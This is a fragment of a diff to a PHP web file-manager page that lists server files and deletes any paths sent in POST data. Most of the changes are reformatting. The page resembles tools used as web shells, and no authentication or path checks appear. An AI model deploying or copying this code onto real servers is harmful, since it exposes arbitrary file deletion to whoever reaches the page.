+        $_SERVER['HTTP_HOST'] .
+        str_replace(
+            $_SERVER['DOCUMENT_ROOT'],
+            '',
+            cwd() . '/' . basename($file)
+        );
+    ?>
 				 <a href="<?= $href ?>" target='_blank'><?= $file ?></a>
 			</td>
 			<td class="screen">
@@ -995,12 +1138,11 @@ foreach ($getpath as $file) {
 					<option value="delete">delete</option>
 					<option value="rename">rename</option>
 				</select>
-				<input type="hidden" name="file" value="<?= cwd().'/'.$file ?>">
+				<input type="hidden" name="file" value="<?= cwd() . '/' . $file ?>">
 			</td>
 			</form>
 		</tr>
-		<?php
-	}
+		<?php }
 }
 ?>
 <tr>
@@ -1015,37 +1157,31 @@ foreach ($getpath as $file) {
 		</form>
 	</thead>
 </tr>
-<?php
-if (!empty(@$data = $_POST['data'])) {
-	foreach ($data as $value) {
-		switch ($_POST['mode']) {
-			case 'delete':
-				if (delete($value)) {
-					?>
+<?php if (!empty(@$data = $_POST['data'])) {
+    foreach ($data as $value) {
+        switch ($_POST['mode']) {
+            case 'delete':
+                if (delete($value)) { ?>
 					<tr>
 						<td class="action">
 							<?= alert("{$value} Deleted !", "success") ?>
 						</td>
 					</tr>
-					<?php
-				} else {
-					?>
+					<?php } else { ?>
 					<tr>
 						<td class="action">
 							<?= alert("{$value} Failed !", "failed") ?>
 						</td>
 					</tr>
-					<?php
-				}
-				break;
-			
-			default:
-				# code...
-				break;
-		}
-	}
-}
-?>
+					<?php }
+                break;
+
+            default:
+                # code...
+                break;
+        }
+    }
+} ?>
 <script type="text/javascript">
 	function checkAll(ele) {
 		var checkboxes = document.getElementsByTagName('input');
